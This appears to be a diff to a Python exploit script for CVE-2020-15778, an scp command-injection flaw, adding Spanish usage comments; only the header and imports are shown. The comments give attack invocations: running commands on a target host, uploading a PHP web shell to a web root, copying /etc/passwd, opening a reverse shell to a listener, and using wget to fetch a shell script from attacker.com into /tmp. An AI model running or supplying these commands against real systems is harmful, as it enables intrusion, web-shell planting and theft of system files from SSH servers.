@@ -1,6 +1,22 @@
 #!/usr/bin/env python3
 # cve_2020_15778.py
 
+# Ejecutar comando simple
+# python3 cve_2020_15778.py 192.168.1.100 -c "id"
+
+# Subir archivo
+# python3 cve_2020_15778.py 192.168.1.100 --upload shell.php /var/www/html/shell.php
+
+# Descargar archivo
+# python3 cve_2020_15778.py 192.168.1.100 --download /etc/passwd ./passwd_copy.txt
+
+# Reverse shell
+# python3 cve_2020_15778.py 192.168.1.100 --reverse-shell --lhost 192.168.1.50 --lport 4444
+
+# Usar script bash simple
+# ./CVE-2020-15778_exploit.sh 192.168.1.100 22 root "wget http://attacker.com/shell.sh -O /tmp/shell.sh"
+
+
 import sys
 import subprocess
 import os
